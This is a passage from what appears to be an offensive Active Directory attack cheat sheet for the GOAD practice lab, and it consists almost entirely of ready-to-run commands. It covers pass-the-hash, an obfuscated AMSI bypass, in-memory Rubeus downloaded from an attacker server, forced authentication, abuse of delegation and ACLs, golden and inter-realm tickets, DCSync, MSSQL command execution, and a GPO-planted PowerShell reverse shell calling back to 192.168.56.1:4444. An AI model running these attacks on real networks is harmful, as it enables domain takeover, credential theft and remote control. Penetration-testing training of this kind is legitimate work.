reg.py NORTH/catelyn.stark@192.168.56.11 -hashes ':cba36eccfd9d949c73bc73715364aff5' add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'
xfreerdp /u:catelyn.stark /d:north.sevenkingdoms.local /pth:cba36eccfd9d949c73bc73715364aff5 /v:192.168.56.11

#Delete the reg for RDP
reg.py NORTH/catelyn.stark@192.168.56.11 -hashes ':cba36eccfd9d949c73bc73715364aff5' delete -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin'

#TGT
getTGT.py -hashes ':cba36eccfd9d949c73bc73715364aff5' north.sevenkingdoms.local/catelyn.stark
export KRB5CCNAME=/workspace/tgt/catelyn.stark.ccache
wmiexec.py -k -no-pass north.sevenkingdoms.local/catelyn.stark@winterfell

#Can also use the tickets dumped with lsassy using impacket ticketConverter
ticketConverter.py kirbi_ticket.kirbi ccache_ticket.ccache
```

## Certificate
### Pass The Certificate
```
certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
```

# Delegations
## Unconstrained delegation
- Connect 
```
xfreerdp /d:north.sevenkingdoms.local /u:eddard.stark /p:'FightP3aceAndHonor!' /v:192.168.56.11 /cert-ignore
```
- From there we will bypass AMSI and launch Rubeus in memory 
- Prepare our server containing Rubeus.exe and our AMSI bypass
`python3 -m http.server 8080`

- On the RDP session bypass AMSI 
```
$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)
(new-object system.net.webclient).downloadstring('http://192.168.56.1:8080/amsi_rmouse.txt')|IEX
```

- Now launch Rubeus in memory with execute assembly. First we will list the available tickets :
```
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.56.1:8080/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data);
[Rubeus.Program]::MainString("triage");
```

- And now force a coerce of the DC kingslanding to the DC winterfell.
`python3 coercer.py -u arya.stark -d north.sevenkingdoms.local -p Needle -t kingslanding.sevenkingdoms.local -l winterfell`

- We look on the triage again :
`[Rubeus.Program]::MainString("triage")`

- Now the tgt of kingslanding should be present

- To extract it (relaunch coercer and 1 sec later launch the following dump command):
`[Rubeus.Program]::MainString("dump /user:kingslanding$ /service:krbtgt /nowrap");`

- We now have the TGT of the domain controller. Let’s continue on linux to pass the ticket and launch dcsync with secretdump by 
1. copying the ticket without space and return line
2. converting the ticket to ccache
3. use the kerberos ticket and launch secretdump

```
cat tgt.b64|base64 -d > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=/workspace/unconstrained/ticket.ccache
secretsdump.py -k -no-pass SEVENKINGDOMS.LOCAL/'KINGSLANDING$'@KINGSLANDING
```

## Constrained Delegation
- Find all the constrained delegation with impacket :
`findDelegation.py NORTH.SEVENKINGDOMS.LOCAL/arya.stark:Needle -target-domain north.sevenkingdoms.local`

To abuse the constrained delegation with protocol transition, the concept is to first ask a TGT for the user and execute S4U2Self followed by a S4U2Proxy to impersonate an admin user to the SPN on the target.

### With protocol transition
#### From windows with Rubeus
```
.\Rubeus.exe asktgt /user:jon.snow /domain:north.sevenkingdoms.local /rc4:B8D76E56E9DAC90539AFF05E3CCB1755
.\Rubeus.exe s4u /ticket:put_the__previous_ticket_here /impersonateuser:administrator /msdsspn:CIFS/winterfell /ptt
```

#### From linux with impacket:
```
getST.py -spn 'CIFS/winterfell' -impersonate Administrator -dc-ip '192.168.56.11' 'north.sevenkingdoms.local/jon.snow:iknownothing'
```

Next we can use the TGS to connect to smb and get a shell with psexec, smbexec, wmiexec

### Without protocol transition
- The constrained delegation with protocol transition was not present originally in the lab, but you can add it with the following commands :
`sudo docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible ansible-playbook vulnerabilities.yml -l dc02 --tags "data,constrained_delegation_kerb"`

- To exploit the constrained delegation here we only need a forwardable TGS as administrator to any service on castelblack

- But if we do a s4u (s4u2self + s4u2proxy) like we did with protocol transition, the s4uself will send us a not forwardable TGS and the attack will fail.

- So to exploit and get the forwardable TGS we need, we first need to add a computer and use RBCD between the created computer (rbcd_const$) and the computer who have delegation set (here castelblack$).

- By doing that, you can do a s4u2self followed by a s4u2proxy on the added computer and the result is a forwardable tgs on hots/castelblack$ as administrator. Once that done, you have the forwardable ticket to pass to s4u2proxy, and we even can change the request service with -altservice

```
# add computer X (rbcd_const)
addcomputer.py -computer-name 'rbcd_const$' -computer-pass 'rbcdpass' -dc-host 192.168.56.11 'north.sevenkingdoms.local/arya.stark:Needle'

# add rbcd from X (rbcd_const) to constrained (castelblack)
rbcd.py -delegate-from 'rbcd_const$' -delegate-to 'castelblack$' -dc-ip 192.168.56.11 -action 'write' -hashes ':b52ee55ea1b9fb81de8c4f0064fa9301' north.sevenkingdoms.local/'castelblack$'
```

- Do the s4u2self followed by the s4u2proxy on castelblack (this is the classic RBCD attack)
```
# s4u2self on X (rbcd_const)
getST.py -self -impersonate "administrator" -dc-ip 192.168.56.11  north.sevenkingdoms.local/'rbcd_const$':'rbcdpass'

# s4u2proxy from X (rbcd_const) to constrained (castelblack)
getST.py -impersonate "administrator" -spn "host/castelblack" -additional-ticket 'administrator@rbcd_const$@NORTH.SEVENKINGDOMS.LOCAL.ccache' -dc-ip 192.168.56.11  north.sevenkingdoms.local/'rbcd_const$':'rbcdpass'
```

- You could also do the 2 (s4u2self + s4u2proxy) in one command :
`getST.py -spn 'host/castelblack' -impersonate Administrator -dc-ip 192.168.56.11 north.sevenkingdoms.local/'rbcd_const$':'rbcdpass'`

- And launch the s4uProxy with the forwardable ticket
```
# s4u2proxy from constrained (castelblack) to target (winterfell) - with altservice to change the SPN in use
getST.py -impersonate "administrator" -spn "http/winterfell" -altservice "cifs/winterfell" -additional-ticket 'administrator@host_castelblack@NORTH.SEVENKINGDOMS.LOCAL.ccache' -dc-ip 192.168.56.11 -hashes ':b52ee55ea1b9fb81de8c4f0064fa9301' north.sevenkingdoms.local/'castelblack$'

export KRB5CCNAME=/workspace/administrator@cifs_winterfell@NORTH.SEVENKINGDOMS.LOCAL.ccache 
wmiexec.py -k -no-pass north.sevenkingdoms.local/administrator@winterfell
```

- After the exploit a little clean up of the lab, flush the rbcd entry and delete the computer account with a domain admin:
```
rbcd.py -delegate-to 'castelblack$' -delegate-from 'rbcd_const$' -dc-ip 192.168.56.11 -action 'flush' -hashes ':b52ee55ea1b9fb81de8c4f0064fa9301' north.sevenkingdoms.local/'castelblack$'
addcomputer.py -computer-name 'rbcd_const$' -computer-pass 'rbcdpass' -dc-host 192.168.56.11 'north.sevenkingdoms.local/eddard.stark:FightP3aceAndHonor!' -delete
```

## Resource Based Constrained Delegation
- Create a computer X (rbcd$)
`addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-host kingslanding.sevenkingdoms.local 'sevenkingdoms.local/stannis.baratheon:Drag0nst0ne'`

- Add delegation write on our target from X (rbcd$)
`rbcd.py -delegate-from 'rbcd$' -delegate-to 'kingslanding$' -dc-ip 'kingslanding.sevenkingdoms.local' -action 'write' sevenkingdoms.local/stannis.baratheon:Drag0nst0ne`

- Now X (rbcd$) got delegation permission on our target, you can now do an s4u2self query followed by an S4u2proxy. This will result in an administrator permission on kingslanding.

```
getST.py -spn 'cifs/kingslanding.sevenkingdoms.local' -impersonate Administrator -dc-ip 'kingslanding.sevenkingdoms.local' 'sevenkingdoms.local/rbcd$:rbcdpass'

export KRB5CCNAME=/workspace/rbcd/Administrator@cifs_kingslanding.sevenkingdoms.local@SEVENKINGDOMS.LOCAL.ccache
wmiexec.py -k -no-pass @kingslanding.sevenkingdoms.local
```

- After the exploit a little clean up of the lab, flush the rbcd entry and delete the computer account with a domain admin:
```
rbcd.py -delegate-from 'rbcd$' -delegate-to 'kingslanding$' -dc-ip 'kingslanding.sevenkingdoms.local' -action 'flush' sevenkingdoms.local/stannis.baratheon:Drag0nst0ne
addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-host kingslanding.sevenkingdoms.local 'sevenkingdoms.local/cersei.lannister:il0vejaime' -delete
```

# ACL
## ForceChangePassword 
- As tywin.lannister we will change jaime.lannister password
`net rpc password jaime.lannister -U sevenkingdoms.local/tywin.lannister%powerkingftw135 -S kingslanding.sevenkingdoms.local`

## GenericWrite on User
This could be abuse with 3 different technics :

- shadowCredentials (windows server 2016 or +)
- targetKerberoasting (password should be weak enough to be cracked)
- logonScript (this need a user connection and to be honest it never worked or unless with a script already inside sysvol)

### Shadow Credentials
`certipy shadow auto -u jaime.lannister@sevenkingdoms.local -p 'pasdebraspasdechocolat' -account 'joffrey.baratheon'`


### Target Kerberoasting (https://github.com/ShutdownRepo/targetedKerberoast)
The principe is simple. Add an SPN to the user, ask for a tgs, remove the SPN on the user. And crack the TGS just like a classic kerberoasting.
`targetedKerberoast.py -v -d sevenkingdoms.local -u jaime.lannister -p pasdebraspasdechocolat --request-user joffrey.baratheon`
crack the hash
`hashcat -m 13100 -a 0 joffrey.hash rockyou.txt --force`

## WriteDacl on User
To exploit writeDacl from Joffrey to Tyron we can use acledit.py
```
git clone https://github.com/ThePorgs/impacket.git
cd impacket 
python3 setup.py install

dacledit.py -action 'read' -principal joffrey.baratheon -target 'tyron.lannister' 'sevenkingdoms.local'/'joffrey.baratheon':'1killerlion'

#now change the permission to “FullControl” and see the modification
dacledit.py -action 'write' -rights 'FullControl' -principal joffrey.baratheon  -target 'tyron.lannister' 'sevenkingdoms.local'/'joffrey.baratheon':'1killerlion'

certipy shadow auto -u joffrey.baratheon@sevenkingdoms.local -p '1killerlion' -account 'tyron.lannister'
```

## Add self on Group
First find the distinguished name
```
ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://192.168.56.10 search '(sAMAccountName=tyron.lannister)' distinguishedName
ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://192.168.56.10 search '(sAMAccountName=Small Council)' distinguishedName
```

Add tyron to Small Council

`ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://192.168.56.10 add_to_group "CN=tyron.lannister,OU=Westerlands,DC=sevenkingdoms,DC=local" "CN=Small Council,OU=Crownlands,DC=sevenkingdoms,DC=local"`

See the result
`ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://192.168.56.10 membersof 'Small Council' `

## AddMember on Group
`ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://192.168.56.10 add_to_group "CN=tyron.lannister,OU=Westerlands,DC=sevenkingdoms,DC=local" "CN=DragonStone,OU=Crownlands,DC=sevenkingdoms,DC=local"`

## WriteOwner on Group
```
owneredit.py -action read -target 'kingsguard' -hashes ':b3b3717f7d51b37fb325f7e7d048e998' sevenkingdoms.local/tyron.lannister
owneredit.py -action write -owner 'tyron.lannister' -target 'kingsguard' -hashes ':b3b3717f7d51b37fb325f7e7d048e998' sevenkingdoms.local/tyron.lannister

dacledit.py -action 'write' -rights 'FullControl' -principal tyron.lannister  -target 'kingsguard' 'sevenkingdoms.local'/'tyron.lannister' -hashes ':b3b3717f7d51b37fb325f7e7d048e998'

ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://192.168.56.10 add_to_group "CN=tyron.lannister,OU=Westerlands,DC=sevenkingdoms,DC=local" "CN=kingsguard,OU=Crownlands,DC=sevenkingdoms,DC=local"
```

## Generic all on user
`net rpc password stannis.baratheon --pw-nt-hash -U sevenkingdoms.local/tyron.lannister%b3b3717f7d51b37fb325f7e7d048e998 -S kingslanding.sevenkingdoms.local`

## GenericAll on Computer
Use Resource Based Constrained Delegation 

## GPO abuse
```
git clone https://github.com/Hackndo/pyGPOAbuse.git
python3 -m virtualenv .venv
source .venv/bin/activate
python3 -m pip install -r requirements.txt

#We get the id from bloodhound and launch the exploit
python3 pygpoabuse.py north.sevenkingdoms.local/samwell.tarly:'Heartsbane' -gpo-id "6F8BD644-2C29-418C-93F1-FE926F91F6B4"

python3 pygpoabuse.py north.sevenkingdoms.local/samwell.tarly:'Heartsbane' -gpo-id "6F8BD644-2C29-418C-93F1-FE926F91F6B4" -powershell -command "\$c = New-Object System.Net.Sockets.TCPClient('192.168.56.1',4444);\$s = \$c.GetStream();[byte[]]\$b = 0..65535|%{0};while((\$i = \$s.Read(\$b, 0, \$b.Length)) -ne 0){    \$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0, \$i);    \$sb = (iex \$d 2>&1 | Out-String );    \$sb = ([text.encoding]::ASCII).GetBytes(\$sb + 'ps> ');    \$s.Write(\$sb,0,\$sb.Length);    \$s.Flush()};\$c.Close()" -taskname "MyTask" -description "don't worry"

# wait or run on the target host the following
gpudate /force
```

## Laps password
```
Get-DomainComputer | where-Object {$_.'ms-mcs-admpwd'} | select dnshostname, ms-mcs-admpwd | ft
cme ldap 192.168.56.12 -d essos.local -u jorah.mormont -p 'H0nnor!' --module laps
```

# Trusts

## Enumerate Trust
```
ldeep ldap -u tywin.lannister -p 'powerkingftw135' -d sevenkingdoms.local -s ldap://192.168.56.10 trusts
ldeep ldap -u tywin.lannister -p 'powerkingftw135' -d sevenkingdoms.local -s ldap://192.168.56.12 trusts
```

## Domain Trust - child/parent (north.sevenkingdoms.local -> sevenkingdoms.local)

### RaiseMeUp - Escalate with impacket raiseChild
To escalate from child to parent the simplest way is with impacket raiseChild.py script, this will do all the work for us.
`raiseChild.py north.sevenkingdoms.local/eddard.stark:'FightP3aceAndHonor!' `

### Golden ticket + ExtraSid
- First dump the krbtgt of the domain we own
```
# dump child ntds and get krbtgt NT hash
secretsdump -just-dc-user north/krbtgt \ 
 north.sevenkingdoms.local/eddard.stark:'FightP3aceAndHonor!'@192.168.56.11

...
krbtgt:502:aa3b435b51404eeaad3b435b51404ee:13354bc6e1b48fff8d66a2090e909b27:::
..
```

- Now get the child and parent domain SID
```
# dump child domain SID 
lookupsid.py  -domain-sids north.sevenkingdoms.local/eddard.stark:'FightP3aceAndHonor!'@192.168.56.11 0

[*] Domain SID is: S-1-5-21-638448100-4005671799-261795860

# dump parent domain SID 
lookupsid.py  -domain-sids north.sevenkingdoms.local/eddard.stark:'FightP3aceAndHonor!'@192.168.56.10 0

[*] Domain SID is: S-1-5-21-1409754491-4246775990-3914137275
```

- And now create the golden ticket : we add “-519” at the end of the extra-sid (means enterprise admin) 
```
ticketer.py -nthash 13354bc6e1b48fff8d66a2090e909b27 \
 -domain-sid S-1-5-21-638448100-4005671799-261795860 \
 -domain north.sevenkingdoms.local \
 -extra-sid S-1-5-21-1409754491-4246775990-3914137275-519 \
 goldenuser
```

- And we use the ticket to dump the parent domain NTDS
```
secretsdump -k -no-pass -just-dc-ntlm \
 north.sevenkingdoms.local/goldenuser@kingslanding.sevenkingdoms.local
```

### Trust ticket - forge inter-realm TGT
Another way to escalate from child to parent is by extracting the trust key and use it to create our trust ticket (a very good explanation and examples with Mimikatz can be found here : https://adsecurity.org/?p=1588)

- The trust key can be found by targeting the netbios name of the domain on the ntds
```
secretsdump -just-dc-user 'SEVENKINGDOMS$' \
 north.sevenkingdoms.local/eddard.stark:'FightP3aceAndHonor!'@192.168.56.11
```

- Now we got the trust key we can forge the ticket just like we done with the krbtgt user hash but this time we will set the spn : krbtgt/parent_domain
```
ticketer.py -nthash cef54bd576fc6054870d8d8cea5c069c \
 -domain-sid S-1-5-21-638448100-4005671799-261795860 \
 -domain north.sevenkingdoms.local \
 -extra-sid S-1-5-21-1409754491-4246775990-3914137275-519 \
 -spn krbtgt/sevenkingdoms.local trustfakeuser
```

- Now we will use the forged TGT to ask a ST on the parent domain
```
export KRB5CCNAME=/workspace/trusts/trustfakeuser.ccache   
getST.py -k -no-pass -spn cifs/kingslanding.sevenkingdoms.local \
 sevenkingdoms.local/trustfakeuser@sevenkingdoms.local -debug
```

- And now we can use our service ticket and connect with smbclient
```
export KRB5CCNAME=/workspace/trusts/trustfakeuser@sevenkingdoms.local@cifs_kingslanding.sevenkingdoms.local@SEVENKINGDOMS.LOCAL.ccache
smbclient.py -k -no-pass trustfakeuser@kingslanding.sevenkingdoms.local
```

- or even dump secrets
`secretsdump -k -no-pass -just-dc-ntlm trustfakeuser@kingslanding.sevenkingdoms.local`


## Forest Trust (sevenkingdoms.local -> essos.local)
### Password reuse
- On a real environment this is really accurate. Dump the ntds of the domain you own and try to find the same users on the external forest domains.
- The lab didn’t have this behavior but it is really simple to exploit

### Foreign group and users
#### Sevenkingdoms to essos : group spys
-  Pick a user from the small council (by example petyer.baelish:@littlefinger@) and exploit with the spy group
```
net rpc password jorah.mormont -U sevenkingdoms.local/petyer.baelish%@littlefinger@ -S meereen.essos.local
Enter new password for jorah.mormont: <here we enter P@ssword123>
```

- And verify
`cme smb 192.168.56.12 -u jorah.mormont -p 'P@ssword123' -d essos.local`

- We can also to that with shadow credentials (but the auto will not work here, we will have to do that with two steps)
```
certipy shadow add -u petyer.baelish@sevenkingdoms.local -p '@littlefinger@' \
 -dc-ip 192.168.56.12 -target meereen.essos.local -account 'jorah.mormont'

certipy auth -pfx jorah.mormont.pfx -username jorah.mormont -domain essos.local -dc-ip 192.168.56.12
```

### Essos to sevenkingdoms : group accros_thenarrowsea
### Use unconstrained delegation
- From kingslanding we can rule the essos domain with unconstrained delegation
- We connect to kingslanding with rdp as an administrator
`xfreerdp /d:sevenkingdoms.local /u:cersei.lannister /p:'il0vejaime' /v:192.168.56.10 /size:80%  /cert-ignore`

- For more simplicity we will disable defender
- Now we launch rubeus.exe to wait for a TGT of the essos forest.

`.\Rubeus.exe monitor /filteruser:MEEREEN$ /interval:1`

- And we run petitpotam on our linux console to force a coerce of meereen to kingslanding.
`petitpotam.py -u arya.stark -p Needle -d north.sevenkingdoms.local kingslanding.sevenkingdoms.local meereen.essos.local`

- And we run petitpotam on our linux console to force a coerce of meereen to kingslanding.
`petitpotam.py -u arya.stark -p Needle -d north.sevenkingdoms.local kingslanding.sevenkingdoms.local meereen.essos.local`

- And we get the TGT of meereen !

- Now we can copy it to linux (delete space and \n) and Decode the base64 and save it to a kirbi file
```
base64 -d rubeus.b64 > meereen.kirbi

# Convert it to ccache and use it to dcsync essos.local
ticketConverter.py meereen.kirbi meereen.ccache 
export KRB5CCNAME=/workspace/trusts/unconstrained/meereen.ccache
secretsdump -k -no-pass -just-dc-ntlm essos.local/'MEEREEN$'@meereen.essos.local
```

### Mssql Trusted link
```
python3 mssqlclient.py -windows-auth north.sevenkingdoms.local/jon.snow:iknownothing@castelblack.north.sevenkingdoms.local

enum_links
use_link BRAAVOS
enable_xp_cmdshell
xp_cmdshell whoami
```

### Golden ticket with external forest, sid history ftw 
This attack can be done only because SID history is enabled on the sevenkingdoms->essos trust

Find the domain sid with lookupsid.py
- essos SID : S-1-5-21-2203133648-1386395927-1390703624
- sevenkingdoms SID: S-1-5-21-1409754491-4246775990-3914137275

```
secretsdump -just-dc-user 'essos/krbtgt' essos.local/daenerys.targaryen:'BurnThemAll!'@192.168.56.12
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e58cf01ba6cc645da9f7ab1f28fc3934:::
...
```

Create the golden ticket for a fake user and use it
```
ticketer.py -nthash e58cf01ba6cc645da9f7ab1f28fc3934 \
-domain-sid S-1-5-21-2203133648-1386395927-1390703624 \
-domain essos.local \
-extra-sid S-1-5-21-1409754491-4246775990-3914137275-1132 \
dragon


export KRB5CCNAME=/workspace/trusts/external/dragon.ccache
smbexec.py -k -no-pass dragon@kingslanding.sevenkingdoms.local -debug

```

### Trust ticket with external forest 
```
secretsdump -just-dc-user 'SEVENKINGDOMS$' essos.local/daenerys.targaryen:'BurnThemAll!'@192.168.56.12
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:285b80ddc1ad529f27403804e75a9ab1:::
...


ticketer.py -nthash 285b80ddc1ad529f27403804e75a9ab1 \
 -domain-sid S-1-5-21-2203133648-1386395927-1390703624 \
 -domain essos.local \
 -extra-sid S-1-5-21-1409754491-4246775990-3914137275-1132 \
 -spn krbtgt/sevenkingdoms.local trustdragon


export KRB5CCNAME=/workspace/trusts/external/trustdragon.ccache
getST.py -k -no-pass -spn cifs/kingslanding.sevenkingdoms.local \
 sevenkingdoms.local/trustdragon@sevenkingdoms.local -debug


export KRB5CCNAME=/workspace/trusts/external/trustdragon@sevenkingdoms.local.ccache
smbexec.py -k -no-pass trustdragon@kingslanding.sevenkingdoms.local -debug
```

### Exploit acl with external trust golden ticket
- Connect as administrator on meereen, disable the antivrius to be able to use mimikatz and powerview
- Create the golden ticket with mimikatz matching the group kingsguard (RID 1130)

```
mimikatz # kerberos::golden /user:guard /domain:essos.local /sid:S-1-5-21-2203133648-1386395927-1390703624 /krbtgt:e58cf01ba6cc645da9f7ab1f28fc3934 /sids:S-1-5-21-1409754491-4246775990-3914137275-1130 /ptt
```

- And now use powerview to change stannis password
```
Import-Module .\powerview.ps1
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity stannis.baratheon -AccountPassword $SecPassword -Domain sevenkingdoms.local
```
